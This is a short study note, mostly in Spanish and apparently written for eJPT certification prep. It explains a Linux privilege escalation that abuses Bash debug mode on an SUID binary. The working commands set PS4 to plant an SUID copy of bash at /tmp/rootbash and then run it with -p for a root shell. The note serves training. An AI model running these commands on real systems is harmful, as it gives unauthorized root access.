Nota: Esto no funcionará en las versiones 4.4 y superiores de Bash.

- Cuando está en modo de depuración, Bash usa la variable de entorno PS4 para mostrar un mensaje adicional para las declaraciones de depuración.

-  Run the **/usr/local/bin/suid-env2** executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:

```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

- Ejecute el ejecutable /tmp/rootbash con -p para obtener un shell que se ejecute con privilegios de root:


```
/tmp/rootbash -p
```

enlace:
[[Local/Ciberseguridad/HACKING/CERTIFICACIONES/EJPT/Preparacion-Ejpt]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Linux/SUID - SGID Executables  Known - Exploits]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Linux/SUID - SGID Executables - Abusing Shell Features (1)]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Linux/SUID - SGID Executables - Environment Variables]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Linux/SUID - SGID Executables - Shared Object Injection]]
